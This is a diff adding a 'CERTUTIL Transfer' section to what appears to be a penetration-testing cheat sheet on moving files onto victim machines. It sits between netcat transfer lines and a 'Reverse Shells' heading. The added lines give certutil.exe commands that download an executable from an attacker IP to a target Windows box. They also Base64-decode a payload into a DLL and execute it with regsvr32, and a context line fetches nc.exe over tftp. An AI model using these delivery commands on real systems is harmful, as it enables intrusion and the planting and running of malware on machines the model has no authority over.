@@ -37,6 +37,23 @@ sender#> nc -w 3 [destination] 4444 < input.file
 
 \(and if it's not - go get it: `C:\Users\burmat>tftp -i 10.10.10.10 get nc.exe`\)
 
+### CERTUTIL Transfer
+
+Using `certutil.exe` is a clever way to get files down to a victim if you are attacking a Windows box and limited on methods:
+
+```text
+certutil.exe -urlcache -split -f http://10.10.15.11/burmat.exe C:\temp\burmat.exe
+```
+
+You can also write a file from Base64 encoded text, too:
+
+```text
+certutil.exe -decode C:\temp\payload.txt C:\temp\payload.dll
+regsvr32 /s /u C:\temp\payload.dll
+```
+
+\(_Source:_ [_http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html_](http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html) __\)
+
 ## REVERSE SHELLS / SHELLS
 
 ### PHP Reverse Shell - Minified
